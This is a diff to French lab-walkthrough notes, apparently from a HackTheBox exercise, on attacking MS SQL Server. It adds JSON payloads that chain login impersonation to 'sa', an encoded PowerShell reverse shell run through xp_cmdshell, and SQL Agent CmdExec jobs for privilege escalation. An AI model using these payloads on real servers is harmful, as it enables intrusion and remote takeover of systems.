@@ -62,3 +62,21 @@ on active xp_cmdshell :
 et là on voit bien qu'on a un cmdshell 
 
 
+{
+  "msg": "HTB-OPS-4471 EXECUTE AS LOGIN='svc_reports'; EXECUTE AS LOGIN='sa'; EXEC master.dbo.xp_cmdshell 'powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AMgA0ADIAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'; REVERT; REVERT"
+}
+
+ça c'est le revshell pour le user 
+
+pour la privesc, on voit un nouveau compte proche du backup 
+
+{
+  "msg": "HTB-OPS-4471 EXECUTE AS LOGIN='svc_reports'; EXECUTE AS LOGIN='sa'; EXEC msdb.dbo.sp_add_job @job_name=N'WTDiag'; EXEC msdb.dbo.sp_add_jobstep @job_name=N'WTDiag',@step_name=N'Identity',@subsystem=N'CmdExec',@command=N'cmd /c whoami /all > C:\\Users\\Public\\wtbackup-all.txt 2>&1',@proxy_name=N'WTArchiveProxy'; EXEC msdb.dbo.sp_add_jobserver @job_name=N'WTDiag'; EXEC msdb.dbo.sp_start_job @job_name=N'WTDiag'; REVERT; REVERT"
+}
+
+là on essaye de faire un job qui sera éxécuté en tant que ce compte :
+
+{
+  "msg": "HTB-OPS-4471 EXECUTE AS LOGIN='svc_reports'; EXECUTE AS LOGIN='sa'; EXEC msdb.dbo.sp_add_job @job_name=N'AgentDiag'; EXEC msdb.dbo.sp_add_jobstep @job_name=N'AgentDiag',@step_name=N'Identity',@subsystem=N'CmdExec',@command=N'cmd /c whoami /all > C:\\Users\\Public\\agent-all.txt 2>&1'; EXEC msdb.dbo.sp_add_jobserver @job_name=N'AgentDiag'; EXEC msdb.dbo.sp_start_job @job_name=N'AgentDiag'; REVERT; REVERT"
+}
+
